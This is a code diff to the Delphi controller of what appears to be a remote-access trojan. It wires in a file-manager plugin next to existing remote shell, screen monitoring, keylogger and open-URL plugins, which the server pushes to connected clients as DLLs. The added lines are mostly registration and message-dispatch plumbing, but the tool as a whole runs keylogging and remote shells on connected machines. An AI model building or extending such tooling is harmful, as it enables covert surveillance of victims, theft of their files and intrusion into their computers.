@@ -13,7 +13,8 @@ uses
   UnitRemoteShell,
   UnitRemoteMonitoring,
   UnitKeylogger,
-  UnitOpenURL;
+  UnitOpenURL,
+  UnitFileManager;
 
 const
   INFORMATION_PLUGIN_ID       = 'InformationPlugin';
@@ -22,7 +23,8 @@ const
   REMOTE_MONITORING_PLUGIN_ID = 'RemoteMonitoringPlugin';
   KEYLOGGER_PLUGIN_ID         = 'KeyloggerPlugin';
   OPEN_URL_PLUGIN_ID          = 'OpenURLPlugin';
-  MAX_JSON_BUFFER_SIZE        = 16 * 1024 * 1024;
+  FILE_MANAGER_PLUGIN_ID      = 'FileManagerPlugin';
+  MAX_JSON_BUFFER_SIZE        = 128 * 1024 * 1024;
   PACKET_TYPE_JSON            = $01;
   PACKET_TYPE_DLL             = $02;
   PACKET_TYPE_MONITOR_FRAME   = $03;
@@ -69,6 +71,7 @@ type
   TRemoteShellReceivedEvent = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TMonitoringReceivedEvent  = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TKeyloggerReceivedEvent   = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
+  TFileManagerReceivedEvent = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TLogEvent                 = procedure(Category: TLogCategory; const Msg: string) of object;
 
   TServerManager = class
@@ -82,6 +85,7 @@ type
     FMonitoringForms  : TDictionary<TncLine, TForm6>;
     FKeyloggerForms   : TDictionary<TncLine, TForm7>;
     FOpenURLForms     : TDictionary<TncLine, TForm8>;
+    FFileManagerForms : TDictionary<TncLine, TForm9>;
     FReadBuffers      : TDictionary<TncLine, TBytes>;
     FHeartbeatTimer   : TTimer;
     FIsStopping       : Boolean;
@@ -94,6 +98,7 @@ type
     FOnRemoteShellReceived: TRemoteShellReceivedEvent;
     FOnMonitoringReceived : TMonitoringReceivedEvent;
     FOnKeyloggerReceived  : TKeyloggerReceivedEvent;
+    FOnFileManagerReceived: TFileManagerReceivedEvent;
     FOnLog                : TLogEvent;
 
     procedure OnConnected   (Sender: TObject; aLine: TncLine);
@@ -112,6 +117,7 @@ type
     procedure DetachMonitoringForms;
     procedure DetachKeyloggerForms;
     procedure DetachOpenURLForms;
+    procedure DetachFileManagerForms;
 
   public
     constructor Create(aServer: TncTCPServer);
@@ -127,6 +133,7 @@ type
     procedure SendRemoteMonitoringPlugin(aLine: TncLine);
     procedure SendKeyloggerPlugin(aLine: TncLine);
     procedure SendOpenURLPlugin(aLine: TncLine);
+    procedure SendFileManagerPlugin(aLine: TncLine);
 
     function  TryGetClientInfo(aLine: TncLine; out Info: TClientInfo): Boolean;
     function  IsActive   : Boolean;
@@ -156,6 +163,10 @@ type
     procedure UnregisterOpenURLForm(aLine: TncLine);
     function  GetOpenURLForm       (aLine: TncLine): TForm8;
 
+    procedure RegisterFileManagerForm  (aLine: TncLine; AForm: TForm9);
+    procedure UnregisterFileManagerForm(aLine: TncLine);
+    function  GetFileManagerForm       (aLine: TncLine): TForm9;
+
     property OnClientConnected    : TClientEvent              read FOnClientConnected     write FOnClientConnected;
     property OnClientUpdated      : TClientEvent              read FOnClientUpdated       write FOnClientUpdated;
     property OnClientDisconnected : TClientRemoveEvent        read FOnClientDisconnected  write FOnClientDisconnected;
@@ -164,6 +175,7 @@ type
     property OnRemoteShellReceived: TRemoteShellReceivedEvent read FOnRemoteShellReceived write FOnRemoteShellReceived;
     property OnMonitoringReceived : TMonitoringReceivedEvent  read FOnMonitoringReceived  write FOnMonitoringReceived;
     property OnKeyloggerReceived  : TKeyloggerReceivedEvent   read FOnKeyloggerReceived   write FOnKeyloggerReceived;
+    property OnFileManagerReceived: TFileManagerReceivedEvent read FOnFileManagerReceived write FOnFileManagerReceived;
     property OnLog                : TLogEvent                 read FOnLog                 write FOnLog;
   end;
 
@@ -214,6 +226,7 @@ begin
   FMonitoringForms  := TDictionary<TncLine, TForm6>.Create;
   FKeyloggerForms   := TDictionary<TncLine, TForm7>.Create;
   FOpenURLForms     := TDictionary<TncLine, TForm8>.Create;
+  FFileManagerForms := TDictionary<TncLine, TForm9>.Create;
   FReadBuffers      := TDictionary<TncLine, TBytes>.Create;
 
   FServer.OnConnected    := OnConnected;
@@ -236,7 +249,9 @@ begin
   DetachMonitoringForms;
   DetachKeyloggerForms;
   DetachOpenURLForms;
+  DetachFileManagerForms;
   FReadBuffers.Free;
+  FFileManagerForms.Free;
   FOpenURLForms.Free;
   FKeyloggerForms.Free;
   FMonitoringForms.Free;
@@ -275,6 +290,7 @@ begin
   FOnRemoteShellReceived:= nil;
   FOnMonitoringReceived := nil;
   FOnKeyloggerReceived  := nil;
+  FOnFileManagerReceived:= nil;
   FOnLog                := nil;
 
   if FServer.Active then
@@ -512,6 +528,41 @@ begin
   end;
 end;
 
+procedure TServerManager.RegisterFileManagerForm(aLine: TncLine; AForm: TForm9);
+begin
+  FLock.Enter;
+  try
+    FFileManagerForms.AddOrSetValue(aLine, AForm);
+  finally
+    FLock.Leave;
+  end;
+end;
+
+procedure TServerManager.UnregisterFileManagerForm(aLine: TncLine);
+var
+  AForm: TForm9;
+begin
+  FLock.Enter;
+  try
+    if FFileManagerForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
+      AForm.DetachCallbacks;
+    FFileManagerForms.Remove(aLine);
+  finally
+    FLock.Leave;
+  end;
+end;
+
+function TServerManager.GetFileManagerForm(aLine: TncLine): TForm9;
+begin
+  FLock.Enter;
+  try
+    if not FFileManagerForms.TryGetValue(aLine, Result) then
+      Result := nil;
+  finally
+    FLock.Leave;
+  end;
+end;
+
 procedure TServerManager.DetachProcessForms;
 var
   AForm: TForm4;
@@ -582,6 +633,21 @@ begin
       if Assigned(AForm) then
         AForm.DetachCallbacks;
     FOpenURLForms.Clear;
+  finally
+    FLock.Leave;
+  end;
+end;
+
+procedure TServerManager.DetachFileManagerForms;
+var
+  AForm: TForm9;
+begin
+  FLock.Enter;
+  try
+    for AForm in FFileManagerForms.Values do
+      if Assigned(AForm) then
+        AForm.DetachCallbacks;
+    FFileManagerForms.Clear;
   finally
     FLock.Leave;
   end;
@@ -776,6 +842,11 @@ begin
   SendPlugin(aLine, OPEN_URL_PLUGIN_ID);
 end;
 
+procedure TServerManager.SendFileManagerPlugin(aLine: TncLine);
+begin
+  SendPlugin(aLine, FILE_MANAGER_PLUGIN_ID);
+end;
+
 { --- Server Olaylari --- }
 
 procedure TServerManager.OnConnected(Sender: TObject; aLine: TncLine);
@@ -821,6 +892,7 @@ var
   MonitoringForm  : TForm6;
   KeyloggerForm   : TForm7;
   OpenURLForm     : TForm8;
+  FileManagerForm : TForm9;
 begin
   IP := aLine.PeerIP;
   FLock.Enter;
@@ -845,6 +917,9 @@ begin
     if FOpenURLForms.TryGetValue(aLine, OpenURLForm) and Assigned(OpenURLForm) then
       OpenURLForm.DetachCallbacks;
     FOpenURLForms.Remove(aLine);
+    if FFileManagerForms.TryGetValue(aLine, FileManagerForm) and Assigned(FileManagerForm) then
+      FileManagerForm.DetachCallbacks;
+    FFileManagerForms.Remove(aLine);
   finally
     FLock.Leave;
   end;
@@ -1055,8 +1130,30 @@ begin
           SendKeyloggerPlugin(aLine)
         else if SameText(PluginID, OPEN_URL_PLUGIN_ID) then
           SendOpenURLPlugin(aLine)
+        else if SameText(PluginID, FILE_MANAGER_PLUGIN_ID) then
+          SendFileManagerPlugin(aLine)
         else
           SendPlugin(aLine, PluginID);
+      end;
+      Exit;
+    end;
+
+    if (Action = 'filemanager_response') then
+    begin
+      DoLog(lcCommand, '"filemanager_response" received from ' + IP);
+      if Assigned(FOnFileManagerReceived) then
+      begin
+        var JSONClone    := TJSONObject(JSONObj.Clone);
+        var CapturedLine := aLine;
+        var CB           := FOnFileManagerReceived;
+        QueueToUI(procedure
+        begin
+          try
+            CB(CapturedLine, JSONClone);
+          finally
+            JSONClone.Free;
+          end;
+        end);
       end;
       Exit;
     end;
